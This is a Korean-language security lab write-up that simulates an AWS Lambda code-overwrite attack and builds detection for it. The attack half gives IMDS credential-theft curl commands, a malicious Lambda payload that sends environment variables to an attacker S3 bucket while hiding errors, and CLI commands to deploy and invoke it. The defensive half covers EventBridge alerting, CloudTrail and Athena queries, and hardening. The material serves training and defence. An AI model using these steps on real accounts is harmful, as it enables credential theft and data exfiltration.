
## 목차
1. [[실습 개요]](#실습-개요)
2. [[인프라 구성]](#인프라-구성)
3. [[공격 시나리오: Lambda 함수 코드 덮어쓰기]](#공격-시나리오-lambda-함수-코드-덮어쓰기)
4. [[탐지 및 자동 대응 시스템]](#탐지-및-자동-대응-시스템)
5. [[로그 분석 및 탐지]](#로그-분석-및-탐지)
6. [[보안 권장사항]](#보안-권장사항)
7. [[결론]](#결론)

---

## 실습 개요

### 실습 목적
AWS Lambda 함수의 코드 덮어쓰기(UpdateFunctionCode) 공격을 시뮬레이션하여, 공격자가 탈취한 IAM Role 자격 증명을 이용해 Lambda 코드를 악성 코드로 덮어쓴 뒤 민감한 데이터를 외부로 전송하는 시나리오를 재현합니다.

### 실습 범위
- EC2 Instance Metadata Service(IMDS)를 통한 IAM 자격 증명 탈취
- Lambda 함수 식별 및 악성 코드 배포
- CloudTrail을 통한 공격 탐지 및 실시간 알림 시스템 구축
- EventBridge와 SNS를 활용한 자동 대응 메커니즘 구현

### 사전 조건
- Terraform으로 구축된 AWS 인프라 환경
- 공격자용 Kali Linux EC2 인스턴스
- 타겟 Lambda 함수(log_security_events) 존재
- CloudTrail 활성화 및 로깅 설정

---

## 인프라 구성

### 전체 아키텍처
```
Internet Gateway
       |
   Public Subnet
   └── Kali Linux (공격자)
       |
   Private Subnet  
   └── Target EC2 (IAM Role 부여)
       |
   Lambda Function (log_security_events)
       |
   CloudTrail → EventBridge → Detection Lambda → SNS Alert
```

### 구성 요소

| 구분 | 리소스 | 역할 | 권한 |
|------|--------|------|------|
| **컴퓨팅** | Kali Linux EC2 | 공격자 머신 | 기본 EC2 권한 |
|  | Target EC2 | 공격 대상 | Lambda 조작 권한 |
|  | Lambda Function | 보안 이벤트 로깅 | S3 접근 권한 |
| **보안/모니터링** | CloudTrail | API 호출 기록 | 전역 로깅 |
|  | EventBridge | 이벤트 탐지 | Lambda 트리거 |
|  | SNS Topic | 알림 전송 | 이메일/SMS 발송 |

### Lambda 함수 권한 구성
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Effect": "Allow",
      "Resource": "arn:aws:logs:::*"
    },
    {
      "Action": [
        "s3:PutObject"
      ],
      "Effect": "Allow",
      "Resource": [
        "arn:aws:s3:::security-reports-logs-68a5fc3d/*",
        "arn:aws:s3:::attacker-exfil-bucket/*"
      ]
    }
  ]
}
```

---

## 공격 시나리오: Lambda 함수 코드 덮어쓰기

### 공격 흐름 개요
```
IAM 자격증명 탈취 → Lambda 함수 식별 → 악성 코드 생성 → 함수 코드 덮어쓰기 → 데이터 유출
```

### 단계별 공격 수행

#### 단계 1: IAM Role 자격 증명 탈취
```bash
# IAM Role 이름 확인
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 자격 정보 추출
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

**응답 데이터 예시:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "IQoJb3JpZ2luX2Vj...",
  "Expiration": "2025-05-27T12:00:00Z"
}
```

#### 단계 2: 공격자 AWS CLI 프로필 구성
```bash
# AWS CLI 프로필 설정
aws configure --profile lambda-attack
```

또는 직접 credentials 파일 편집:
```ini
[lambda-attack]
aws_access_key_id = <탈취된 키>
aws_secret_access_key = <탈취된 비밀 키>
aws_session_token = <세션 토큰>
region = ap-northeast-2
```

#### 단계 3: 타겟 Lambda 함수 식별
```bash
# Lambda 함수 목록 조회
aws lambda list-functions --profile lambda-attack

# 특정 함수 정보 확인
aws lambda get-function --function-name log_security_events --profile lambda-attack
```

#### 단계 4: 악성 Lambda Payload 작성

**lambda_function.py** (악성 코드):
```python
import boto3
import json

def lambda_handler(event, context):
    """
    악성 Lambda 함수 - 내부 데이터를 외부로 유출
    """
    s3 = boto3.client('s3')
    
    # 민감한 내부 데이터 수집
    sensitive_data = {
        "timestamp": context.aws_request_id,
        "environment_vars": dict(os.environ),
        "internal_data": "CONFIDENTIAL COMPANY SECRETS",
        "credentials": "EXTRACTED_API_KEYS"
    }
    
    # 공격자의 S3 버킷으로 데이터 전송
    try:
        s3.put_object(
            Bucket='attacker-exfil-bucket',
            Key=f'exfiltrated_data_{context.aws_request_id}.json',
            Body=json.dumps(sensitive_data),
            ContentType='application/json'
        )
        
        return {
            'statusCode': 200,
            'body': json.dumps('Data successfully exfiltrated')
        }
    except Exception as e:
        # 탐지를 피하기 위해 정상적인 응답 반환
        return {
            'statusCode': 200,
            'body': json.dumps('Function executed normally')
        }
```

**패키지 생성:**
```bash
# 악성 코드 압축
zip lambda_payload.zip lambda_function.py
```

#### 단계 5: Lambda 함수 코드 덮어쓰기
```bash
# Lambda 함수 코드 교체
aws lambda update-function-code \
  --function-name log_security_events \
  --zip-file fileb://lambda_payload.zip \
  --profile lambda-attack \
  --region ap-northeast-2
```

#### 단계 6: 악성 함수 실행 유도

**자동 트리거 대기:**
```bash
# CloudTrail 이벤트 유발을 통한 자동 실행
aws ec2 describe-instances --profile lambda-attack
```

**수동 실행 (권한이 있는 경우):**
```bash
# Lambda 함수 직접 호출
aws lambda invoke \
  --function-name log_security_events \
  --region ap-northeast-2 \
  --profile lambda-attack \
  --payload '{}' \
  output.json
```

### 공격자가 필요한 최소 IAM 권한
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "lambda:UpdateFunctionCode",
        "lambda:GetFunction",
        "lambda:ListFunctions",
        "lambda:InvokeFunction"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "iam:PassRole"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject"
      ],
      "Resource": "*"
    }
  ]
}
```

---

## 탐지 및 자동 대응 시스템

### 실시간 탐지 아키텍처
```
CloudTrail → EventBridge Rule → Detection Lambda → SNS → 관리자 알림
     ↓
 S3 저장소
     ↓
 Athena 분석
```

### EventBridge 탐지 규칙 설정

#### UpdateFunctionCode 이벤트 탐지
```json
{
  "source": ["aws.lambda"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["UpdateFunctionCode"]
  }
}
```

### 자동 대응 Lambda 함수

**lambda_overwrite_alert.py:**
```python
import json
import boto3
import os

def lambda_handler(event, context):
    """
    Lambda 함수 코드 변경 탐지 및 알림 전송
    """
    sns = boto3.client('sns')
    
    # CloudTrail 이벤트 정보 추출
    detail = event.get('detail', {})
    user_arn = detail.get('userIdentity', {}).get('arn', '알 수 없음')
    source_ip = detail.get('sourceIPAddress', '알 수 없음')
    function_name = detail.get('requestParameters', {}).get('functionName', '알 수 없음')
    region = detail.get('awsRegion', '알 수 없음')
    event_time = detail.get('eventTime', '알 수 없음')
    user_agent = detail.get('userAgent', '알 수 없음')

    # 보안 알림 메시지 구성
    subject = "긴급: Lambda 함수 코드 변경 탐지"
    message = f"""
보안 경고: Lambda Function 코드가 덮어쓰여졌습니다.

=== 공격 상세 정보 ===
• 함수 이름: {function_name}
• 공격자 ARN: {user_arn}
• 소스 IP: {source_ip}
• 리전: {region}
• 발생 시간: {event_time}
• User Agent: {user_agent}

=== 권장 조치 ===
1. 해당 Lambda 함수 즉시 비활성화
2. 함수 코드 무결성 검증
3. IAM 자격 증명 탈취 여부 조사
4. 관련 CloudTrail 로그 상세 분석

즉시 대응이 필요합니다.
    """

    # SNS 알림 전송
    try:
        response = sns.publish(
            TopicArn='arn:aws:sns:ap-northeast-2:867344475403:security-alerts-topic',
            Subject=subject,
            Message=message
        )
        
        print(f"Alert sent successfully: {response['MessageId']}")
        
        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Security alert sent successfully',
                'function_name': function_name,
                'source_ip': source_ip
            })
        }
        
    except Exception as e:
        print(f"Error sending alert: {str(e)}")
        return {
            'statusCode': 500,
            'body': json.dumps({
                'error': 'Failed to send security alert',
                'details': str(e)
            })
        }
```

### SNS 알림 메시지 예시
```
제목: 긴급: Lambda 함수 코드 변경 탐지

내용:
보안 경고: Lambda Function 코드가 덮어쓰여졌습니다.

=== 공격 상세 정보 ===
• 함수 이름: log_security_events
• 공격자 ARN: arn:aws:iam::867344475403:user/admin
• 소스 IP: 10.0.0.15
• 리전: ap-northeast-2
• 발생 시간: 2025-05-27T10:30:00Z
• User Agent: aws-cli/2.13.0 Python/3.11.3

=== 권장 조치 ===
1. 해당 Lambda 함수 즉시 비활성화
2. 함수 코드 무결성 검증
3. IAM 자격 증명 탈취 여부 조사
4. 관련 CloudTrail 로그 상세 분석

즉시 대응이 필요합니다.
```

---

## 로그 분석 및 탐지

### CloudTrail 로그 분석

#### 주요 탐지 이벤트

**Lambda 함수 코드 변경 이벤트:**
```json
{
  "eventTime": "2025-05-27T10:30:00Z",
  "eventName": "UpdateFunctionCode",
  "eventSource": "lambda.amazonaws.com",
  "sourceIPAddress": "10.0.0.15",
  "userAgent": "aws-cli/2.13.0 Python/3.11.3 Linux/5.15.0-kali3-amd64",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::867344475403:assumed-role/lambda-attack-role/i-0123456789abcdef0"
  },
  "requestParameters": {
    "functionName": "log_security_events"
  },
  "responseElements": {
    "functionName": "log_security_events",
    "lastModified": "2025-05-27T10:30:00.000+0000"
  }
}
```

**탐지 포인트:**
- 평상시와 다른 시간대의 Lambda 코드 변경
- Kali Linux User-Agent 포함
- 외부 IP에서의 Lambda 함수 조작
- 비정상적인 함수 호출 패턴

### Amazon Athena 분석 쿼리

#### Lambda 함수 코드 변경 추적
```sql
SELECT 
    eventtime,
    eventname,
    requestparameters.functionname as function_name,
    sourceipaddress,
    useragent,
    useridentity.arn as user_arn
FROM cloudtrail_logs 
WHERE eventname = 'UpdateFunctionCode'
  AND eventtime > current_date - interval '7' day
ORDER BY eventtime DESC;
```

#### 의심스러운 Lambda 활동 탐지
```sql
SELECT 
    eventtime,
    eventname,
    sourceipaddress,
    useridentity.arn,
    requestparameters
FROM cloudtrail_logs
WHERE eventname IN ('UpdateFunctionCode', 'InvokeFunction', 'GetFunction')
  AND sourceipaddress NOT LIKE '10.%'
  AND useragent LIKE '%kali%'
  AND eventtime > current_date - interval '1' day
ORDER BY eventtime DESC;
```

---

## 보안 권장사항

### 예방적 보안 조치

#### IAM 정책 강화

**조건부 Lambda 함수 업데이트 권한:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "lambda:UpdateFunctionCode",
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "aws:RequestedRegion": "ap-northeast-2",
          "aws:PrincipalTag/Department": "DevOps"
        },
        "IpAddress": {
          "aws:SourceIp": ["10.0.0.0/8", "192.168.0.0/16"]
        },
        "DateGreaterThan": {
          "aws:CurrentTime": "08:00:00Z"
        },
        "DateLessThan": {
          "aws:CurrentTime": "18:00:00Z"
        }
      }
    }
  ]
}
```

#### Lambda 함수 보안 강화

**함수 코드 무결성 검증:**
```python
import hashlib
import boto3

def verify_function_integrity():
    """
    Lambda 함수 코드 해시 검증
    """
    lambda_client = boto3.client('lambda')
    
    # 알려진 정상 코드 해시
    expected_hash = "a1b2c3d4e5f6..."
    
    # 현재 함수 코드 해시 확인
    response = lambda_client.get_function(FunctionName='log_security_events')
    current_hash = response['Configuration']['CodeSha256']
    
    if current_hash != expected_hash:
        # 무결성 위반 알림
        send_integrity_alert(current_hash, expected_hash)
        return False
    
    return True
```

#### EC2 메타데이터 보안

**IMDSv2 강제 적용:**
```bash
# EC2 인스턴스에서 IMDSv2 강제 설정
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

### 운영 환경 보안 체크리스트

| 영역 | 실습 환경 | 운영 환경 권장 | 우선순위 |
|------|-----------|---------------|----------|
| **Lambda 권한** | 광범위한 S3 권한 | 최소한의 필요 권한만 부여 | 🔴 High |
| **코드 배포** | 직접 업데이트 허용 | CI/CD 파이프라인을 통한 배포만 허용 | 🔴 High |
| **모니터링** | 기본 CloudTrail | 실시간 알림 + 자동 차단 | 🔴 High |
| **접근 제어** | IP 제한 없음 | VPN/내부망에서만 접근 허용 | 🟡 Medium |
| **코드 검증** | 무결성 검사 없음 | 주기적 해시 검증 | 🟡 Medium |

### 지속적 모니터링 체계

#### 필수 모니터링 이벤트
- `UpdateFunctionCode` - Lambda 코드 변경 탐지
- `InvokeFunction` - 비정상적인 함수 실행 패턴
- `GetFunction` - 함수 정보 탐색 행위
- `ListFunctions` - 함수 목록 조회 (정찰 활동)
- `PutItem/GetItem` - DynamoDB 데이터 접근 (데이터 유출)

---

## 결론

본 실습을 통해 AWS Lambda 함수 코드 덮어쓰기 공격의 전체 과정을 확인했습니다. 공격자는 EC2 메타데이터 서비스를 통해 IAM 자격 증명을 탈취한 후, Lambda 함수의 코드를 악성 코드로 교체하여 내부 데이터를 외부로 유출할 수 있음을 확인했습니다.

특히 주목할 점은 Lambda 함수의 특성상 서버리스 환경에서 실행되어 탐지가 어렵고, 한 번 코드가 변경되면 해당 함수가 트리거될 때마다 지속적으로 악성 행위를 수행할 수 있다는 것입니다.

실제 운영 환경에서는 다음과 같은 보안 조치를 반드시 적용해야 합니다:

1. **최소 권한 원칙** - Lambda 함수에 필요한 최소한의 권한만 부여
2. **코드 무결성 검증** - 주기적인 함수 코드 해시 검증
3. **실시간 모니터링** - UpdateFunctionCode 이벤트에 대한 즉시 알림
4. **접근 제어 강화** - IP 제한 및 시간 기반 접근 제어
5. **CI/CD 파이프라인** - 승인된 배포 프로세스를 통한 코드 변경만 허용

이러한 보안 조치를 통해 Lambda 함수 덮어쓰기 공격을 효과적으로 방지하고, 만약 공격이 발생하더라도 신속한 탐지와 대응이 가능할 것입니다.
